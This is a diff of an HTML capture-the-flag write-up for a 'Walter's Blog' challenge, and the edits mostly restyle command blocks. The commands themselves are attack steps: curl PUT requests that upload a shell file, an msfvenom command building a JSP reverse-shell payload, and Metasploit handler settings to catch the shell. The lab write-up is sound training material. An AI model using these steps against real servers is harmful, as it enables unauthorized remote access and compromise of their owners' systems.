@@ -83,10 +83,10 @@
                             <br>
                             <br>Back to Nikto results, it is displaying a vulnerability from the web server allowing any visitor to upload files on the webserver using a PUT request.
                             So, let’s create a PUT request with a file, there are several ways to create a PUT request, for example: 
-                            <ul>                            
-                            <li>curl -v -X PUT -F ‘file=@shell.php’ http://waltersblog3.chall.malicecyber.com</li>
-                            <li>curl -v -T shell.php http://waltersblog3.chall.malicecyber.com</li>
-                            </ul>
+                                                       
+                            <div class="squarebox">curl -v -X PUT -F ‘file=@shell.php’ http://waltersblog3.chall.malicecyber.com</div>
+                            <div class="squarebox">curl -v -T shell.php http://waltersblog3.chall.malicecyber.com</div>
+                            
                             <img src="img/WaltersBlog/curlput.png" class="img-fluid" width="600">
                             To make sure that the file is correctly in the web server, we can use “<i>wget</i>” to retrieve the file and see if it is present, but normally everything should be fine since we get the response code 201. HTTP 201 code means that the file has been successfully created.
                             <img src="img/WaltersBlog/wget.png" class="img-fluid" width="600">
@@ -96,7 +96,8 @@
 
                             Using Msfvenom, we can create a payload to open a reverse shell when the process is running on the webserver. We know that to run the file, we just have to go to the page and he will automatically run the .jsp file. <br>
                             Let's use <strong>Msfvenom</strong> to create the malicious .jsp payload and then we'll upload the file on the webserver. <br>
-                            <br><strong>Msfvenom -p java/jsp_shell_reverse_tcp LHOST=[Your public IP address] LPORT=[Port to listen] -f raw > shell.jsp</strong>
+                            
+                            <div class="squarebox">Msfvenom -p java/jsp_shell_reverse_tcp LHOST=[Your public IP address] LPORT=[Port to listen] -f raw > shell.jsp</div>
 
                             <img src="img/WaltersBlog/curlfail.png" class="img-fluid" width="600">
 
@@ -107,14 +108,14 @@
                             <img src="img/WaltersBlog/burp.png" class="img-fluid" width="600">
 
                             It works, we got a return code 201, which means that the webserver doesn't return any error. <br>
-                            Once we have done that, the payload is on the website. And all it remains to do is to listen on the port and run the file on the system. <br>
+                            Once we have done that, the payload is on the website. And all it remains to do is to listen on the port and run the file on the system.
 
-                            <strong><br>Sudo msfdb init & msfconsole start <br>
+                            <div class="squarebox">Sudo msfdb init & msfconsole start <br>
                             msf > use exploit/multi/handler <br>
                             msf exploit(handler)> set PAYLOAD java/jsp_shell_reverse_tcp <br>
                             msf exploit(handler) > set LHOST 192.168.190.133  <br>
                             msf exploit(handler) > set LPORT 4444  <br>
-                            msf exploit(handler) > exploit <br></strong>
+                            msf exploit(handler) > exploit <br></div>
 
                             <br>If that does not work, you must check your firewall or router settings. Here is a <a href="../../tutorial/openforwardport.html">tutorial</a> to open and forward a port to a virtual machine.
 
